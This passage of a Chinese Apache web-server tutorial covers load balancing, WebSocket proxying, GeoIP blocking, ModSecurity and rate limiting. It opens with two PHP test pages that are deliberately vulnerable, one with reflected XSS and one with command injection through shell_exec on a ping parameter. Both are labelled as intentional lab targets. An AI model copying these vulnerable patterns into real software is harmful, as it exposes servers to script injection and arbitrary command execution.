<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/xss-test.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">// ⚠️ 故意设计的有漏洞代码</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">if(isset($_GET['name'])) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    echo &quot;Hello, &quot; . $_GET['name'] . &quot;!&quot;;  // 反射型XSS漏洞</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;form method=&quot;GET&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/form></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span></code></pre></figure>
<h3 id="10-命令注入测试环境">10. 命令注入测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#10-命令注入测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建命令注入测试页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/cmd-test.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">// ⚠️ 故意设计的有漏洞代码</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">if(isset($_GET['ip'])) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    $ip = $_GET['ip'];</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    $output = shell_exec(&quot;ping -c 4 &quot; . $ip);  // 命令注入漏洞</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    echo &quot;&lt;pre>$output&lt;/pre>&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;form method=&quot;GET&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    IP Address: &lt;input type=&quot;text&quot; name=&quot;ip&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/form></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span></code></pre></figure>
<h2 id="十一高级配置">十一、高级配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十一高级配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-配置反向代理负载均衡">1. 配置反向代理负载均衡<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-配置反向代理负载均衡" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_http</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_balancer</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lbmethod_byrequests</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> loadbalancer.local</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Proxy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> balancer://mycluster</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        BalancerMember</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> http://backend1:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> route=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        BalancerMember</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> http://backend2:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> route=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        BalancerMember</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> http://backend3:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> route=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        ProxySet lbmethod=byrequests</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        ProxySet stickysession=ROUTEID</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Proxy</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / balancer://mycluster/</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / balancer://mycluster/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 负载均衡器管理页面</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /balancer-manager</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SetHandler</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> balancer-manager</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> local</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="2-websocket代理配置">2. WebSocket代理配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-websocket代理配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_wstunnel</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ws.example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # WebSocket代理</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /ws ws://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/ws</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /ws ws://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/ws</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 常规HTTP</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="3-配置ip地理位置阻止">3. 配置IP地理位置阻止<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-配置ip地理位置阻止" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装GeoIP模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> libapache2-mod-geoip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> geoip-database</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> geoip</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_geoip.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    GeoIPEnable </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">On</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    GeoIPDBFile /usr/share/GeoIP/GeoIP.dat</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 阻止特定国家</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    SetEnvIf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> GEOIP_COUNTRY_CODE CN BlockCountry</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    SetEnvIf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> GEOIP_COUNTRY_CODE RU BlockCountry</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;RequireAll></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> not env BlockCountry</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;/RequireAll></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="4-配置modsecurity-waf">4. 配置ModSecurity WAF<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-配置modsecurity-waf" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装ModSecurity</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> libapache2-mod-security2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 复制推荐配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/modsecurity.conf-recommended</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/modsecurity.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编辑配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/modsecurity.conf</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改: SecRuleEngine On</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 下载OWASP核心规则集</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">wget</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://github.com/coreruleset/coreruleset/archive/refs/heads/main.zip</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">unzip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> main.zip</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mv</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> coreruleset-main</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/crs</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/crs/crs-setup.conf.example</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/modsecurity/crs/crs-setup.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用规则</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/mods-enabled/security2.conf</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> security2_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    SecDataDir /var/cache/modsecurity</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/*.conf</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/crs/crs-setup.conf</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    IncludeOptional</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/modsecurity/crs/rules/*.conf</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h3 id="5-配置访问频率限制">5. 配置访问频率限制<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-配置访问频率限制" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ratelimit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> evasive</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用mod_evasive</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_evasive20.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSHashTableSize </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3097</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSPageCount </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSSiteCount </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">50</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSPageInterval </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSSiteInterval </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSBlockingPeriod </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">10</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSEmailNotify admin@example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOSLogDir /var/log/apache2/evasive</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="6-配置自定义错误页面">6. 配置自定义错误页面<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-配置自定义错误页面" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建自定义错误页面目录</span></span>
